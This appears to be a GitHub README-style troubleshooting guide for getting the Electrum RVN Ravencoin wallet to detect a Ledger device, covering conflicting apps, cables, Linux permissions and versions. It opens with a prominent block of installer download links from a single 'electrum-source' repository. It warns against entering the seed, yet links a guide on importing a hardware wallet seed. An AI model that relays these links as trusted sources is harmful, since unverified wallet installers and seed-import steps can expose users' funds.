![Electrum RVN](assets/banner-article.png)

# Ledger Not Detected by Electrum RVN

<!-- compact-download-block -->

<p align="center">Cable, app and bridge, in the order to check them</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A Ledger the wallet cannot see is usually held by another application, sitting on the wrong screen, or connected through a cable that only charges. The device is rarely broken. Work through the causes in order - each one is a two-minute check, and the first two explain most failures.

## 1. Something else is holding the device

Only one application can talk to a hardware wallet at a time. Vendor software is the classic culprit: Ledger Live, a browser wallet extension, or another instance of this wallet, all of which grab the device on connection and do not let go.

**Fix:** quit those applications completely - not just their windows - unplug the device, plug it back in, and let the wallet scan again. On macOS, check the menu bar for a background process; on Windows, the system tray.

This is the single most common cause, and it looks exactly like a broken device: the wallet reports nothing, the cable is fine, the device lights up.

## 2. The device is not ready to be used

The device must be unlocked with its PIN, and if your model uses a per-coin app, that app must be open. A device on its dashboard, or locked, will not answer a wallet.

**Fix:** unlock on the device, open the Ravencoin app if one is required, and leave the device on that screen while the wallet scans.

## 3. The cable, or the port

A charge-only cable carries power and no data. A hub, a dock or a front-panel port can do the same.

**Fix:** use the cable that came with the device, plugged directly into the machine. Then try another port before another cable.

## 4. Permissions on Linux

On Linux, the device node needs permissions your user account may not have. The symptom is a device that the system sees and the wallet does not, and the usual fix is the vendor's udev rules, installed once and reloaded.

**Fix:** install the vendor's udev rules, reload the rules, unplug and replug. If the wallet then sees the device, this was it.

## 5. A wallet that needs the device's app installed

If the wallet expects a specific Ravencoin app on the device and the app is not installed, the connection can succeed and the wallet still show nothing usable.

**Fix:** install the app through the vendor's software, open it, and try again.

## 6. A stale or mismatched version

A wallet build that predates your device's firmware can fail to recognise it. That is a version problem, not a detection problem.

**Fix:** update the wallet from the releases page - https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0 - and try once more before deeper troubleshooting.

## What not to do

- **Do not reinstall the wallet repeatedly.** It will not change which application holds the device.
- **Do not disable security features on the machine** to force a connection.
- **Do not enter the seed into software** because the device "will not connect". That converts a connection problem into a key exposure - [importing a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md).
- **Do not buy a second device** before trying a different cable.

## Checking whether the machine sees the device at all

That distinction narrows the problem to one layer. If the operating system lists the device but the wallet does not, the issue is application-level: another app holding it, missing permissions, or the wrong screen. If the system does not list it, the issue is physical: cable, port or device.

On Linux, the system log tells you when a device is attached. On Windows and macOS, the device manager or system information view does the same. A device that never appears is a hardware or cable problem, and no amount of wallet configuration will fix it.

## When it is genuinely the device

Rare, but real: a failed device, a damaged port, or firmware in a bad state. Before concluding that, try the device with the vendor's own software on a second machine. If it fails there too, the device is the problem, and the recovery phrase you wrote at setup is the path forward - [using a Trezor with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md) is the equivalent when you are switching device lines, and [pairing a Ledger with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md) is the setup this page assumes.

## Keeping it from recurring

Close vendor software before opening the wallet. Keep one cable you know works. Do not run two wallets against one device. Update the wallet and the device firmware deliberately rather than mid-transaction.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Wallet file encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md) covers the file side of the pairing, and [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) is the wider checklist. The audit claim, if you are checking it, is [Electrum RVN security audit](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-security-audit.md).

## FAQ

### Why does my Ledger show in Ledger Live but not in the wallet?

Because Ledger Live is holding it. Only one application can use the device at a time - quit the other one completely and reconnect.

### Do I need the Ravencoin app open?

If your device model uses per-coin apps, yes. Open it on the device and leave it there while the wallet scans.

### Could the cable be the problem?

Often. A charge-only cable or a hub will fail silently. Use the supplied cable, directly into the machine.

### Is my device broken?

Usually not. Test it with the vendor's software on a second machine before concluding anything; if it works there, the problem is on this side.

### Should I import the seed to get access?

No. That turns a connection problem into a key exposure. Fix the connection, or recover onto a replacement device.

<!-- related-articles -->

## Related articles

- [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md)
- [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md)
- [Pairing a Ledger With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/pairing-a-ledger-with-electrum-rvn.md)
- [Wallet File Encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md)
